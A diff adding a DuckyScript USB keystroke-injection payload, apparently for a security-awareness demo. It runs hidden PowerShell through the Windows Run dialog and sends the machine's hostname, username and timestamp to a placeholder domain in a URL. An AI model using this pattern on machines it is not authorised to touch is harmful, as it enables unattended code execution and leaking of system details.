@@ -1,0 +1,23 @@
+REM Unattended Workstation Security Awareness Demo
+REM Target: Windows
+REM Author: Security Team
+REM
+REM This payload opens a browser to the security awareness page
+REM with the target's hostname and username as URL parameters.
+
+REM Initial delay to let the device enumerate
+DELAY 1000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Execute PowerShell command to launch browser with system info. REMEMBER TO ADD CUSTOM DOMAIN
+STRING powershell -WindowStyle Hidden -Command "$h=[System.Net.WebUtility]::UrlEncode($env:COMPUTERNAME);$u=[System.Net.WebUtility]::UrlEncode($env:USERNAME);$t=[System.Net.WebUtility]::UrlEncode((Get-Date -Format 'dd/MM/yyyy HH:mm:ss'));Start-Process \"https://ENTERDOMAIN?hostname=$h&username=$u&timestamp=$t\""
+ENTER
+
+REM Wait for browser to launch and page to load
+DELAY 2500
+
+REM Send F11 to enter fullscreen mode
+F11
